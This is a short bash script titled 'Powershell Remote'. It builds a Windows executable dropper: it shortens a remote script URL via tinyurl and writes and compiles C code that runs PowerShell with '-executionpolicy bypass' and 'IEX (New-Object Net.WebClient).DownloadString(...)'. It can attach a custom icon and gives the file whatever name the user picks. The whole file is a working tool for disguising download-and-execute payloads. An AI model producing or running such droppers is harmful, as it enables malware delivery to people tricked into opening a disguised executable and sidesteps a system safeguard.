#!/bin/bash
# ---------------------------------------------------------------------------
# # Powershell Remote 
#
# # Copyright 2015, Kris Occhipinti <http://filmsbykris.com>
#
# # This program is free software: you can redistribute it and/or modify
# # it under the terms of the GNU General Public License as published by
# # the Free Software Foundation, either version 3 of the License, or
# # (at your option) any later version.
#
# # This program is distributed in the hope that it will be useful,
# # but WITHOUT ANY WARRANTY; without even the implied warranty of
# # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# # GNU General Public License at <http://www.gnu.org/licenses/> for
# # more details.
#
# # Revision history:
# # ---------------------------------------------------------------------------
#creates exe for windows from remote powershell script
clear

if [ "$1" == "--help" ]
then
  echo "Useage: $0 <ps1 url> <icon url>"
  echo "Example: $0 'http://pastebin.com/raw.php?i=40uygcfp' 'http://tinyurl.com/mdnagnb'"
  exit
fi

resource="i686-w64-mingw32-windres"
compiler="i686-w64-mingw32-gcc"

if [ "$1" != "" ]
then
    url="$1"
else
    echo "What is the URL of the ps1 file?"
    read url
fi

mkdir -p win32/bin
mkdir -p win32/res

echo "Getting tiny url..."
url="$(wget -q "http://tinyurl.com/api-create.php?url=$url" -O-)"

echo "New URL is $url"

echo "Creating main.c..."
echo "#include <stdio.h>" > win32/main.c
echo "int main(){" >> win32/main.c
echo "    system(\"powershell -executionpolicy bypass \\\"IEX (New-Object Net.WebClient).DownloadString('$url'); \\\"\");">> win32/main.c
echo "}" >> win32/main.c


if [ "$2" != "" ]
then
    echo "Creating ICON resource..."
    icon="win32/res/icon.ico"
    convert -resize x64 -gravity center -crop 64x64+0+0 $2 \
    -background transparent \
    -flatten -colors 256 $icon
    
    echo "id ICON $icon" > win32/main.rc

    echo "Compiling..."
    $resource -o win32/ico.o win32/main.rc
    $compiler win32/main.c win32/ico.o -o win32/bin/main.exe
else
    echo "Compiling..."
    $compiler win32/main.c -o win32/bin/main.exe
fi

echo "What would you like to name the output EXE file?"
read exe

mv "win32/bin/main.exe" "win32/bin/$exe"

echo "Executable created as 'win32/bin/$exe'"

